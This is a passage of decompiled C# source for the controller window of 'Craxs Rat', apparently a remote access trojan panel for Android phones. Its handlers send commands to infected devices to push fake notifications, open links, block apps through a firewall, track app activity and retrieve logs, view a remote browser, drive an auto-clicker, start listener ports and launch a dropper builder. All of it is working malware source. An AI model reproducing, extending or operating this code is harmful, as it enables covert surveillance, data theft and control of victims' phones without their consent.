								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "noti<*>" + text4 + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + selected.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								selected
							};
							selected.SendMessage(parametersObjects);
						}
						CraxsAlert.ShowSucess("Notification Sent Successfully");
					}
					notificationMaker.Dispose();
				}
				return;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
				return;
			}
		}
		CraxsAlert.Showinformation("No Clients Found");
	}

	private void DrakeUIAvatar8_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (client.IsonVPN)
		{
			Codes.MyMsgBox("Alert", "Firewall is already active", useno: false, Resources.warning48px);
			return;
		}
		string[] array = client.Keys.Split(':');
		int num = 0;
		int num2 = 0;
		if (Codes.MyMsgBox("Alert", "Client will restart connection", useno: true, Resources.warning48px))
		{
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>S" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
			Thread.Sleep(1000);
			client.Close(client.myClient);
		}
	}

	private void DrakeUIAvatar9_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (!client.IsonVPN)
		{
			Codes.MyMsgBox("Alert", "Firewall is already disabled", useno: false, Resources.warning48px);
			return;
		}
		string[] array = client.Keys.Split(':');
		int num = 0;
		int num2 = 0;
		if (Codes.MyMsgBox("Alert", "Client will restart connection", useno: true, Resources.warning48px))
		{
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>T" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
			Thread.Sleep(1000);
			client.Close(client.myClient);
		}
	}

	private void DrakeUIAvatar5_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count > 0 && ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>C" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void AllowAppToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (DGFW.Rows.Count != 0)
		{
			if (DGFW.SelectedRows.Count == 0)
			{
				CraxsAlert.Showinformation("Select app first");
				return;
			}
			if (Operators.CompareString(DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", TextCompare: false) == 0)
			{
				CraxsAlert.Showinformation("Select app is not Blocked.");
				return;
			}
			string text = DGFW.SelectedRows[0].Cells[3].Value.ToString();
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>A>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem15_Click_1(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (DGFW.Rows.Count != 0)
		{
			if (DGFW.SelectedRows.Count == 0)
			{
				CraxsAlert.Showinformation("Select app first");
				return;
			}
			if (Operators.CompareString(DGFW.SelectedRows[0].Cells[2].Value.ToString(), "Allowed", TextCompare: false) != 0)
			{
				CraxsAlert.Showinformation("Select app is already Blocked.");
				return;
			}
			string text = DGFW.SelectedRows[0].Cells[3].Value.ToString();
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "FW<*>B>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIAvatar10_Click(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon17_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Web_Browser_" + client.ClientAddressIP;
						WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
						if (webViewMonitor == null)
						{
							webViewMonitor = new WebViewMonitor();
							webViewMonitor.Name = name;
							webViewMonitor.Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP);
							webViewMonitor.Tag = client.ClientAddressIP;
							webViewMonitor.Classclient = client;
							webViewMonitor.Show();
						}
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon18_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Auto_Clicker_" + client.ClientRemoteAddress;
						Auto_Clicker auto_Clicker = (Auto_Clicker)MyProject.Application.OpenForms[name];
						if (auto_Clicker != null)
						{
							break;
						}
						auto_Clicker = new Auto_Clicker();
						auto_Clicker.Name = name;
						auto_Clicker.Classclient = client;
						auto_Clicker.Show();
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon19_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
					{
						continue;
					}
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter Link";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
						{
							break;
						}
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lnk<*>" + reso.ChekLink(dialog.Mytext.Text) + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void DrakeUIButtonIcon16_Click(object sender, EventArgs e)
	{
		TRKPANEL.BringToFront();
	}

	private void DrakeUIButtonIcon14_Click_1(object sender, EventArgs e)
	{
		FWPANEL.BringToFront();
	}

	private void DrakeUIAvatar11_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count > 0 && ClientsWindow.SelectedRows.Count > 0)
		{
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>L" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem20_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			string text = DGVTRK.SelectedRows[0].Cells[3].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>S>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void DrakeUIButtonIcon20_Click(object sender, EventArgs e)
	{
		recordsShowpanel.SendToBack();
		recordshowtext.Text = "";
	}

	private void ToolStripMenuItem21_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[2].Value.ToString(), "Yes", TextCompare: false) != 0)
			{
				Codes.MyMsgBox("Alert", "There are no logs for this app yet.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[4].Value.ToString();
			recordshowtext.Text = text;
			recordsShowpanel.BringToFront();
		}
	}

	private void ToolStripMenuItem23_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>R>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem19_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			if ((combodatestrack.Items == null) | string.IsNullOrEmpty(combodatestrack.Text))
			{
				Codes.MyMsgBox("Alert", "Select Snaps Date.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>G>" + text + ">" + client.ClientRemoteAddress + ">" + combodatestrack.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem24_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		Dialog1 dialog = new Dialog1();
		dialog.Title = "Enter App ID";
		dialog.ShowDialog();
		if (dialog.DialogResult == DialogResult.OK)
		{
			string text = dialog.Mytext.Text;
			if (Codes.IsValidPackageName(text) || Codes.MyMsgBox("Alert", "this new ID is not valid as app id\r\nare you sure you want to continue ?", useno: true, Resources.error48px))
			{
				Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
				string[] array = client.Keys.Split(':');
				object[] parametersObjects = new object[4]
				{
					client.myClient,
					SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>A>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
					Codes.Encoding().GetBytes("null"),
					client
				};
				client.SendMessage(parametersObjects);
			}
		}
	}

	private void ToolStripMenuItem22_Click(object sender, EventArgs e)
	{
		if (DGVTRK.Rows.Count > 0 && DGVTRK.SelectedRows.Count > 0)
		{
			if (Operators.CompareString(DGVTRK.SelectedRows[0].Cells[1].Value.ToString(), "Not Found", TextCompare: false) == 0)
			{
				Codes.MyMsgBox("Alert", "this app is not installed on this phone.", useno: false, Resources.error48px);
				return;
			}
			if ((combodatestrack.Items == null) | string.IsNullOrEmpty(combodatestrack.Text))
			{
				Codes.MyMsgBox("Alert", "Select Snaps Date.", useno: false, Resources.error48px);
				return;
			}
			string text = DGVTRK.SelectedRows[0].Cells[1].Value.ToString();
			Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>D>" + text + ">" + combodatestrack.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void ToolStripMenuItem25_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.Rows.Count <= 0 || ClientsWindow.SelectedRows.Count <= 0)
		{
			return;
		}
		Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
		if (DGFW.Rows.Count != 0)
		{
			if (DGFW.SelectedRows.Count == 0)
			{
				CraxsAlert.Showinformation("Select app first");
				return;
			}
			string text = DGFW.SelectedRows[0].Cells[3].Value.ToString();
			string[] array = client.Keys.Split(':');
			object[] parametersObjects = new object[4]
			{
				client.myClient,
				SecurityKey.KeysClient2 + Data.SPL_SOCKET + "MO<*>A>" + text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
				Codes.Encoding().GetBytes("null"),
				client
			};
			client.SendMessage(parametersObjects);
		}
	}

	private void DGVSERVS_CellClick(object sender, DataGridViewCellEventArgs e)
	{
		if (e.ColumnIndex != 0 || e.RowIndex < 0)
		{
			return;
		}
		string left = DGVSERVS.Rows[e.RowIndex].Cells[e.ColumnIndex].Tag.ToString();
		DGVSERVS.ClearSelection();
		DGVSERVS.CurrentCell = DGVSERVS.Rows[e.RowIndex].Cells[0];
		DGVSERVS.Rows[e.RowIndex].Selected = true;
		if (Operators.CompareString(left, "OFF", TextCompare: false) == 0)
		{
			_Closure_0024__212_002D0 arg = default(_Closure_0024__212_002D0);
			_Closure_0024__212_002D0 CS_0024_003C_003E8__locals7 = new _Closure_0024__212_002D0(arg);
			CS_0024_003C_003E8__locals7._0024VB_0024Me = this;
			string path = Application.StartupPath + "\\res\\Config\\Pass.inf";
			CS_0024_003C_003E8__locals7._0024VB_0024Local_portnumber = Conversions.ToString(DGVSERVS.SelectedRows[0].Tag);
			int port = Conversions.ToInteger(CS_0024_003C_003E8__locals7._0024VB_0024Local_portnumber);
			DataGridViewRow dataGridViewRow = DGVSERVS.SelectedRows[0];
			if (dataGridViewRow != null)
			{
				string right = dataGridViewRow.Cells[1].Value.ToString();
				dataGridViewRow = null;
				bool flag = false;
				foreach (Accept item in server)
				{
					if (Operators.CompareString(item.Myport, right, TextCompare: false) == 0)
					{
						flag = true;
						break;
					}
				}
				if (flag)
				{
					CraxsAlert.Showinformation("this port is already active");
					return;
				}
			}
			if (!Codes.CheckPort(port))
			{
				Codes.MyMsgBox("Port in use", "this port:" + CS_0024_003C_003E8__locals7._0024VB_0024Local_portnumber + "  is used by another program.", useno: false, Resources.warning48px);
				return;
			}
			if (!File.Exists(path))
			{
				File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
			}
			string[] array = File.ReadAllLines(path);
			if (Operators.CompareString(passtxt.Text, Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY), TextCompare: false) != 0)
			{
				if (passtxt.Text.Length > 3)
				{
					string text = File.ReadAllText(path);
					text = text.Replace(array.GetValue(0).ToString(), Codes.Encrypt(passtxt.Text, Data.THEKEY));
					File.WriteAllText(path, text);
				}
				else if (passtxt.Text.Length < 4)
				{
					Codes.MyMsgBox("Warning", "Password Shoud be more Than 3 chars", useno: false, Resources.warning48px);
					return;
				}
			}
			try
			{
				array = File.ReadAllLines(path);
				if (array.GetValue(0).ToString().Length < 3)
				{
					File.WriteAllText(path, Codes.Encrypt("X0X0X", Data.THEKEY));
					Data.password = Codes.AES_Decrypt(Codes.Encrypt("X0X0X", Data.THEKEY), Data.THEKEY);
				}
				else
				{
					Data.password = Codes.AES_Decrypt(array.GetValue(0).ToString(), Data.THEKEY);
				}
				Thread thread = new Thread([SpecialName] () =>
				{
					CS_0024_003C_003E8__locals7._0024VB_0024Me.server.Add(new Accept(CS_0024_003C_003E8__locals7._0024VB_0024Local_portnumber));
				});
				thread.IsBackground = true;
				thread.Start();
				DGVSERVS.SelectedRows[0].Cells[0].Value = Resources.swtchon;
				DGVSERVS.SelectedRows[0].Cells[0].Tag = "ON";
				DGVSERVS.SelectedRows[0].Cells[2].Value = "ON";
				DGVSERVS.SelectedRows[0].Cells[2].Style.ForeColor = System.Drawing.Color.Lime;
				CraxsAlert.ShowSucess("Server Start on " + CS_0024_003C_003E8__locals7._0024VB_0024Local_portnumber + " Successfully");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		DataGridViewRow dataGridViewRow2 = DGVSERVS.SelectedRows[0];
		if (dataGridViewRow2 == null)
		{
			return;
		}
		string text2 = dataGridViewRow2.Cells[1].Value.ToString();
		Accept accept = null;
		foreach (Accept item2 in server)
		{
			if (Operators.CompareString(item2.Myport, text2, TextCompare: false) == 0)
			{
				item2.MainListner.Server.Close();
				item2.MainListner.Server.Dispose();
				item2.MainListner.Stop();
				dataGridViewRow2.Cells[0].Value = Resources.swtchoff;
				dataGridViewRow2.Cells[0].Tag = "OFF";
				dataGridViewRow2.Cells[2].Value = "OFF";
				dataGridViewRow2.Cells[2].Style.ForeColor = System.Drawing.Color.Red;
				PORTs.Replace(text2 + ">", "");
				accept = item2;
				break;
			}
		}
		if (accept != null)
		{
			server.Remove(accept);
			accept = null;
		}
	}

	private void Droperbtn_Click(object sender, EventArgs e)
	{
		if (DR == null)
		{
			DR = new Drooper();
			DialogResult dialogResult = DR.ShowDialog(this);
			if (dialogResult != DialogResult.OK)
			{
				DR.Close();
				DR = null;
			}
			else
			{
				DR.Close();
				DR = null;
			}
		}
	}

	private void ClientsWindow_CellEndEdit(object sender, DataGridViewCellEventArgs e)
	{
		int num = ClientsWindow.Width;
		int num2 = ClientsWindow.Height;
		int num3 = 0;
		checked
		{
			int num4 = ClientsWindow.Columns.Count - 1;
			for (int i = 0; i <= num4; i++)
			{
				num3 += ClientsWindow.Columns[i].Width;
			}
			num3 += 50;
			ClientsWindow.Size = new Size(num3, num2);
			ClientsWindow.Width = num3;
			int num5 = ClientsWindow.Width;
			int num6 = num5 - num;
			DashboardPanel.Width += num6;
		}
	}

	private void Satustimer_Tick(object sender, EventArgs e)
	{
		try
		{
			if (ClientsWindow.Rows.Count > 0)
			{
				if (ClientsWindow.SelectedRows.Count > 0)
				{
					Client client = (Client)ClientsWindow.SelectedRows[0].Cells[8].Tag;
					if ((client == null) | !client.isconnected)
					{
						TCavatar.Image = null;
						uncheckbtn.Visible = false;
						clientfoldrbtn.Visible = false;
						MonitorPanel.Visible = false;
						FWstatus.ForeColor = System.Drawing.Color.SkyBlue;
						DGFW.DataSource = null;
						DGVTRK.DataSource = null;
						combodatestrack.Items.Clear();
						combodatestrack.Text = "";
						return;
					}
					Bitmap image = (Bitmap)client.Wallpaper.Clone();
					if (TCavatar.Image != null)
					{
						TCavatar.Image.Dispose();
					}
					TCavatar.Image = image;
					uncheckbtn.Visible = true;
					clientfoldrbtn.Visible = true;
					client.Row.Cells[12].Value = client.ActiveNow;
					if (client.IsonVPN)
					{
						FWstatus.ForeColor = System.Drawing.Color.SkyBlue;
					}
					else
					{
						FWstatus.ForeColor = System.Drawing.Color.SkyBlue;
					}
					if (client.FirewallTable != null && client.FirewallTable.Rows.Count > 0)
					{
						DGFW.DataSource = client.FirewallTable;
					}
					if (client.TrackedAppsTable != null)
					{
						if (client.TrackedAppsTable.Rows.Count > 0)
						{
							DGVTRK.DataSource = client.TrackedAppsTable;
							DGVTRK.Columns[4].Visible = false;
						}
						if (client.TrackedDatesFounded != null && combodatestrack.Items != null && combodatestrack.Items.Count == 0 && client.TrackedDatesFounded.Length != 0)
						{
							string[] trackedDatesFounded = client.TrackedDatesFounded;
							foreach (string item in trackedDatesFounded)
							{
								combodatestrack.Items.Add(item);
							}
							combodatestrack.Text = Conversions.ToString(combodatestrack.Items[0]);
						}
					}
					MonitorPanel.Visible = true;
				}
				else
				{
					TCavatar.Image = null;
					uncheckbtn.Visible = false;
					clientfoldrbtn.Visible = false;
					MonitorPanel.Visible = false;
					FWstatus.ForeColor = System.Drawing.Color.SkyBlue;
					DGFW.DataSource = null;
					DGVTRK.DataSource = null;
					combodatestrack.Items.Clear();
					combodatestrack.Text = "";
				}
			}
			else
			{
				DGFW.DataSource = null;
				DGVTRK.DataSource = null;
				TCavatar.Image = null;
				uncheckbtn.Visible = false;
				clientfoldrbtn.Visible = false;
				MonitorPanel.Visible = false;
				FWstatus.ForeColor = System.Drawing.Color.SkyBlue;
				combodatestrack.Items.Clear();
				combodatestrack.Text = "";
			}
		}
		catch (Exception)
		{
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		string eMAIL = RegistryHandler.Get_EMAIL();
		string p = Codes.getuserkey();
		checked
		{
			if (Conversions.ToBoolean(Codes.Apihear(eMAIL, p)))
			{
				xt_err = 0;
			}
			else
			{
				xt_err++;
			}
			if (xt_err > 5)
			{
				Environment.Exit(0);
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Craxs_Rat.CraxsRatMain));
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle10 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle11 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle12 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle13 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle14 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle15 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle16 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle17 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle18 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle19 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle20 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle21 = new System.Windows.Forms.DataGridViewCellStyle();
